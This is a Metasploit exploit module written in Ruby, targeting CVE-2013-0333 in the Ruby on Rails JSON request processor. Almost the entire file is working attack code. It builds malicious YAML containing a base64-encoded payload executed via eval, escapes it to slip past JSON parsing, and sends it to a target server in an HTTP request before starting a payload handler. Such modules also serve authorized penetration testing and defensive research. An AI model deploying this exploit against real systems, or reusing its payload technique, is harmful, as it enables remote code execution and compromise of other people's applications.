##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'yaml'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::CmdStagerTFTP
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Ruby on Rails JSON Processor YAML Deserialization Code Execution',
			'Description'    => %q{
					This module exploits a remote code execution vulnerability in the JSON request
				processor of the Ruby on Rails application framework. This vulnerability allows
				an attacker to instantiate a remote object, which in turn can be used to execute
				any ruby code remotely in the context of the application.

				This module has been tested on RoR 3.0.19

				The technique used by this module requires the target to be running a fairly recent
				version of Ruby 1.9 (since 2011 or so). Applications using Ruby 1.8 may still be
				exploitable using the init_with() method, but this has not been demonstrated.

			},
			'Author'         =>
				[
					'charliesome',  # PoC
					'espes',        # PoC and Metasploit module
					'lian',         # Identified the RouteSet::NamedRouteCollection vector
					'hdm'           # Module merge/conversion/payload work
				],
			'License'        => MSF_LICENSE,
			'References'  =>
				[
					['CVE', '2013-0333'],
				],
			'Platform'       => 'ruby',
			'Arch'           => ARCH_RUBY,
			'Privileged'     => false,
			'Targets'        =>	[ ['Automatic', {} ] ],
			'DisclosureDate' => 'Jan 28 2013',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('TARGETURI', [ true, 'The path to a vulnerable Ruby on Rails application', "/"]),
				OptString.new('HTTP_METHOD', [ true, 'The HTTP request method (GET, POST, PUT typically work)', "POST"])

			], self.class)

	end

	#
	# Create the YAML document that will be embedded into the JSON
	#
	def build_yaml_rails2

		code = Rex::Text.encode_base64(payload.encoded)
		yaml =
			"--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\n" +
			"'#{Rex::Text.rand_text_alpha(rand(8)+1)}; " +
			"eval(%[#{code}].unpack(%[m0])[0]);' " +
			": !ruby/object:ActionController::Routing::Route\n segments: []\n requirements:\n   " +
			":#{Rex::Text.rand_text_alpha(rand(8)+1)}:\n     :#{Rex::Text.rand_text_alpha(rand(8)+1)}: " +
			":#{Rex::Text.rand_text_alpha(rand(8)+1)}\n"
		yaml.gsub(':', '\u003a')
	end


	#
	# Create the YAML document that will be embedded into the JSON
	#
	def build_yaml_rails3

		code = Rex::Text.encode_base64(payload.encoded)
		yaml =
			"--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection\n" +
			"'#{Rex::Text.rand_text_alpha(rand(8)+1)};eval(%[#{code}].unpack(%[m0])[0]);' " +
			": !ruby/object:OpenStruct\n table:\n  :defaults: {}\n"
		yaml.gsub(':', '\u003a')
	end


	#
	# Send the actual request
	#
	def exploit

		print_status("Sending Railsv3 request to #{rhost}:#{rport}...")
		send_request_cgi({
			'uri'     => normalize_uri(target_uri.path),
			'method'  => datastore['HTTP_METHOD'],
			'ctype'   => 'application/json',
			'headers' => { 'X-HTTP-Method-Override' => 'get' },
			'data'    => build_yaml_rails3
		}, 25)
		handler

	end
end
